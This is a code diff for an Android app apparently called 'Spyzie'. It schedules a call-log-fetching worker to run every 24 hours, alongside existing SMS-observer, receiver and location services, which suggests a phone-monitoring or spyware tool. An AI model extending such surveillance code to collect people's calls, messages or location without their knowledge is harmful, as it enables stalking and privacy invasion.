@@ -11,12 +11,18 @@ import android.provider.Telephony;
 import android.util.Log;
 
 import androidx.annotation.Nullable;
+import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
 
 import com.tantd.spyzie.SpyzieApplication;
+import com.tantd.spyzie.data.device.worker.GetCallsWorker;
 import com.tantd.spyzie.di.module.ServiceModule;
 import com.tantd.spyzie.receiver.SmsObserver;
 import com.tantd.spyzie.receiver.SpyzieReceiver;
 import com.tantd.spyzie.util.Constants;
+
+import java.util.concurrent.TimeUnit;
 
 public class MainService extends Service {
 
@@ -25,6 +31,8 @@ public class MainService extends Service {
     private ContentObserver mContentObserver;
 
     private SpyzieReceiver mSpyzieReceiver;
+
+    private PeriodicWorkRequest mGetCallsWorkRequest;
 
     @Override
     public void onCreate() {
@@ -56,7 +64,15 @@ public class MainService extends Service {
         Intent locationServiceIntent = new Intent(this, LocationService.class);
         LocationService.enqueueWork(this, locationServiceIntent);
 
+        startGetCallsWorkRequest();
+
         return START_STICKY;
+    }
+
+    private void startGetCallsWorkRequest() {
+        mGetCallsWorkRequest = new PeriodicWorkRequest.Builder(GetCallsWorker.class, 24, TimeUnit.HOURS).build();
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(GetCallsWorker.GET_CALLS_WORK_REQUEST,
+                ExistingPeriodicWorkPolicy.KEEP, mGetCallsWorkRequest);
     }
 
     @Override
@@ -70,6 +86,9 @@ public class MainService extends Service {
         LocationService.stopAllWork();
 
         releaseServiceComponent();
+
+        // TODO: cancel all work requests
+        WorkManager.getInstance(this).cancelWorkById(mGetCallsWorkRequest.getId());
     }
 
     @Nullable
